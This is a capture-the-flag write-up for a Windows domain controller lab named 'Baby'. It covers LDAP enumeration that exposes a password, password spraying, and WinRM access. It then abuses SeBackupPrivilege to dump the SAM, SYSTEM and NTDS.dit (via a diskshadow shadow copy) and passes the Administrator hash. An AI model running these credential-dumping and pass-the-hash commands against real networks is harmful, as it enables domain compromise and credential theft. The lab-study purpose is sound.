# Baby Writeup


## 1 Nmap
 $ sudo nmap -p- -sC -sV --min-rate 1000 10.129.116.120

 domain name is "baby.vl"
 hostname is "BabyDC.baby.vl"
 
 $ echo "10.129.116.120 baby.vl BabyDC.baby.vl" | sudo tee -a /etc/hosts

 Results of nmap scan show that the target machine is Windows and LDAP port(389, 3268) is open

## 2 user flag
 $ ldapsearch -x -b "dc=baby,dc=vl" "(objectClass=user)" -H ldap://BabyDC.baby.vl

 I got usernames, so add the usernames to a file "users.txt"
 Also, there is exposed password "BabyStart123!" in the field of "Teresa Bell"
 $ nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
 but, authentication was unsuccessfull

 $ ldapsearch -x -b "dc=baby, dc=vl" "*" -H ldap://BabyDC.baby.vl | grep dn
 this command allow us to view only the objects "Distinguished Name"
 Common Name, Container, Organizational Units, Domain Components

 we get new username, "Ian Walker", "Caroline Robinson"
 -> add these to users.txt and execute nxc command again

 Authentication was successfull with Caroline.Robinson

 the password is expired, so set the new password
 $ smbpasswd -U BABY/caroline.robinson -r baby.vl

 Now, we can get access with the password we set and get user flag!!
 $ evil-winrm -i baby.vl -u caroline.robinson -p {New password}


## 3 root flag
 winrm$ whoami /priv
 the output show that caroline robinson account have  
    "SeBackupPrivilege", "SeRestorePrivilege" which are usually given to users in the "Backup Operators" group.

 winrm$ whoami /groups
 caroline robinson is in the Backup Operators.

 SeBackupPrivilege will allow us to create backups of regstry files, including NTLM hashes.

 winrm$ reg save hklm\sam .\sam
 winrm$ reg save hklm\system .\system

 winrm$ download sam
 winrm$ download system

 we get the target system's hashes infomation.
 $ impacket-secretsdump -sam sam -system system LOCAL
 get Administrator hash
 -> $ evil-winrm -i baby.vl -u Administrator -H {hash}
 but cannot get in the target...

 NTDS.dit contains encrypted AD user domain hashes, so Let's get the file.
 live file is locked (AD is using the file?) -> create a volume shadow and read the copy (We have "SeBackupPrivilege")
 
  1. create the script of diskshadow (create E drive)
 
   """
   set verbose on
   set metadata C:\Windows\Temp\test.cab
   set context persistent
   add volume C: alias cdrive
   create
   expose %cdrive% E:
   """
   [!!]target machine is windows, so use '\r\n', not '\n' for newline

  2. send the scripts to the target
    winrm$ upload backup.txt C:\Users\Caroline.Robinson\Documents 
 
  3. get ntds.dit
   winrm$ diskshadow /s ./backup.txt
  ->now, there is E drive which is full copy of C drive
   winrm$ robocopy /b E:\Windows\ntds . ntds.dit
   winrm$ download ntds.dit

 now, we have ntds.dit on our attacking machine

 $ impacket-secretsdump -system system -ntdsd ntds.dit LOCAL
 now, we have domain hash for Administrator
 -> $ evil-winrm -i baby.vl -u Administrator -H {domain hash}

 [+] Get in the target as administrator and get root flag!! [+]
